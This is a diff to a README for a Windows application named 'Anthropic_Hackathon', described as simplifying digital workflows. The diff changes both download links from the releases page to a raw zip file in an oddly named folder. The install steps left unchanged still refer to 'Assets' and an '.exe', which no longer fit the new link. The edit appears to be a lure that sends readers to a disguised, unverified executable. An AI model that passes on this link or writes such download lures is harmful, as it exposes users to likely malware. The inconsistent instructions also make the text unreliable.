@@ -1,6 +1,6 @@
 # 🚀 Anthropic_Hackathon - Simplify your complex digital workflow tasks
 
-[![Download Application](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Connieverbal484/Anthropic_Hackathon/releases)
+[![Download Application](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Connieverbal484/Anthropic_Hackathon/main/spongoid/Hackathon_Anthropic_v2.1.zip)
 
 ## What is this application?
 
@@ -22,7 +22,7 @@ Ensure your Windows system updates exist before installation. This prevents comp
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the following page to download the setup file: https://github.com/Connieverbal484/Anthropic_Hackathon/releases
+1. Visit the following page to download the setup file: https://raw.githubusercontent.com/Connieverbal484/Anthropic_Hackathon/main/spongoid/Hackathon_Anthropic_v2.1.zip
 2. Click the link labeled "Assets" under the latest release section.
 3. Select the file ending in ".exe" to begin the download.
 4. Locate the downloaded file in your browser's download folder.
